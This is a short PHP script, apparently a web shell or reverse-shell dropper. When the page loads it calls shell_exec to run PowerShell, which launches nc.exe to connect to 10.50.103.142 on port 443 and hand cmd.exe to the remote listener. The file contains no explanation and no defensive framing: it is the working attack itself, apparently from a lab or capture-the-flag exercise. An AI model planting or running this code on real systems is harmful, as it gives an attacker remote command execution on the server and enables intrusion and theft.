<?php
  function runnc() {
    $init = "powershell.exe ";
    $payload = " .\nc.exe 10.50.103.142 443 -e cmd.exe";
    $execution_command = "shell_exec";
    $query = $execution_command("$init $payload");
    echo $query; // Execute query
  }
  runnc();
?>
